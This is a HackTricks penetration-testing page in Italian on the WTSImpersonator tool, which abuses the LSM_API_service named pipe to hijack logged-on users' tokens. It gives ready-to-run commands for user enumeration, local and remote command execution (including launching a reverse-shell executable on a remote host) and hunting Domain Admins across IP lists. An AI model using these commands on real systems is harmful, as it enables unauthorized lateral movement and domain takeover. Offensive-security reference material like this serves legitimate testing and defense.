# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Lo strumento **WTS Impersonator** sfrutta la named pipe RPC **"\\pipe\LSM_API_service"** per enumerare furtivamente gli utenti connessi e dirottare i loro token, aggirando le tradizionali tecniche di Token Impersonation. Questo approccio facilita i movimenti laterali senza interruzioni all'interno delle reti. L'innovazione alla base di questa tecnica è attribuita a **Omri Baso, il cui lavoro è disponibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Funzionalità principali

Lo strumento opera attraverso una sequenza di chiamate API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli principali e utilizzo

- **Enumerazione degli utenti**: con lo strumento è possibile enumerare utenti locali e remoti, utilizzando comandi per entrambi gli scenari:

- In locale:
```bash
.\WTSImpersonator.exe -m enum
```
- In remoto, specificando un indirizzo IP o un hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Esecuzione di comandi**: i moduli `exec` e `exec-remote` richiedono un contesto **Service** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:

- Esempio di esecuzione di un comando locale:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- È possibile utilizzare PsExec64.exe per ottenere un contesto di servizio:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Esecuzione remota di comandi**: consiste nel creare e installare un servizio in remoto, in modo simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.

- Esempio di esecuzione remota:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modulo User Hunting**: prende di mira utenti specifici su più macchine, eseguendo codice con le loro credenziali. È particolarmente utile per prendere di mira Domain Admins con diritti di amministratore locale su diversi sistemi.
- Esempio di utilizzo:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Riferimenti

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
